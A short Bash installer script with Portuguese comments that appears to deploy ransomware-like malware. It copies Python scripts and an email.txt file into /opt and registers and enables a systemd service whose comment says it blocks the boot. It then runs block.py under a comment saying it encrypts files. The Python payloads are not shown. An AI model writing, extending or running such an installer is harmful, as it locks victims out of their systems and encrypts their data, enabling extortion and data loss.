#obter o path dos ficheiros
SCRIPT=`realpath -s $0`
SCRIPTPATH=`dirname $SCRIPT`
echo $SCRIPTPATH
# configurar o servico para bloquear o boot

#copiar código a correr no boot para a pasta /opt
chmod +x $SCRIPTPATH/bootsh
cp $SCRIPTPATH/boot_block.py /opt/
cp $SCRIPTPATH/bootsh /opt/
cp $SCRIPTPATH/block.py /opt/
cp $SCRIPTPATH/email.txt /opt/
echo 'Done 1'

#copiar servico para a pasta especifica
cp $SCRIPTPATH/block.service /etc/systemd/system/

#ativar o servico
systemctl daemon-reload
systemctl enable block.service
echo 'Done 2'

# encrypt files
python3 /opt/block.py
echo 'Done 3'

